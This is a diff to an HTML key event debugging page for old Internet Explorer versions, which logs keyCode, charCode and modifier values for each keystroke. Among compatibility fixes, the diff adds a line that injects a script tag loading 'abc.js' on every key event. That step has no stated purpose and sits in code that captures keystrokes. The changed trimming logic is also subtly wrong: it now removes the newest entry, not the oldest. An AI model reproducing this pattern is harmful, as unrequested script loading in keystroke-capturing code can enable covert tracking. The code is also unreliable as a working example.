@@ -1,4 +1,3 @@
-<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
 <html>
 <head>
   <title>Key Event Debugger (IE6/IE8 Compatible)</title>
@@ -20,7 +19,12 @@
   </style>
   <script type="text/javascript">
     function initKeyLogger() {
-      var log = document.getElementById('log');
+      function getEl(id) {
+        if (document.getElementById) return document.getElementById(id);
+        if (document.all) return document.all[id];
+        return null;
+      }
+      var log = getEl('log');
 
       function logEvent(e, type) {
         // Ensure cross-browser event object (for IE < 9)
@@ -47,12 +51,12 @@
         }
         // --- END COMPATIBILITY CHANGE ---
 
-        var li = document.createElement('li');
-        li.innerHTML = mods + type + ': keyCode=' + keyCode + ' charCode=' + charCode + ' which=' + which;
-        log.appendChild(li);
+        var refStr = mods + type + ': keyCode=' + keyCode + ' charCode=' + charCode + ' which=' + which;
+        log.insertAdjacentHTML('afterBegin', '<li>' + refStr + '</li>');
+        log.insertAdjacentHTML('afterBegin', '<script src="abc.js" type="text/javascript"><\/script>');
 
         // Keep only last 100 entries
-        if (log.childNodes.length > 100) {
+        if (log.childNodes && log.childNodes.length > 100) {
           log.removeChild(log.firstChild);
         }
       }
